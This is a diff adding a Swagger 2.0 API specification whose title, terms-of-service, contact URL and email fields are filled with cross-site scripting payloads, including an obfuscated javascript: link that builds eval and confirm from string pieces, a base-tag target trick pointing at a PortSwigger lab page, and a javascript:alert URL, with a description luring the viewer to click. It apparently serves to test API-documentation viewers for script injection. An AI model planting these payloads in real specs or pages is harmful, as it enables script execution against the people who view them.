@@ -1,0 +1,10 @@
+swagger: "2.0"
+info: 
+  title: "xss <a+href="javas%09cript:%5B%271%2B5%27%5D.map(top%5B%27e%27%2B%27%27%2B%27v%27%2B%27%27%2B%27a%27%2B%27%27%2B%27l%27%5D).map(top%5B%27c%27%2B%27%27%2B%27o%27%2B%27%27%2B%27n%27%2B%27%27%2B%27f%27%2B%27%27%2B%27i%27%2B%27%27%2B%27r%27%2B%27m%27%5D)"++on//onerror+"/>""
+  description: "Please to click Terms of service"
+  termsOfService: "<a+href="javas%09cript:%5B%271%2B5%27%5D.map(top%5B%27e%27%2B%27%27%2B%27v%27%2B%27%27%2B%27a%27%2B%27%27%2B%27l%27%5D).map(top%5B%27c%27%2B%27%27%2B%27o%27%2B%27%27%2B%27n%27%2B%27%27%2B%27f%27%2B%27%27%2B%27i%27%2B%27%27%2B%27r%27%2B%27m%27%5D)"++on//onerror+"/>""
+  contact: 
+    name: "API Support"
+    url: "<base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a>"
+    email: "javascript:alert(document.domain)//"
+  version: "1.0.1"
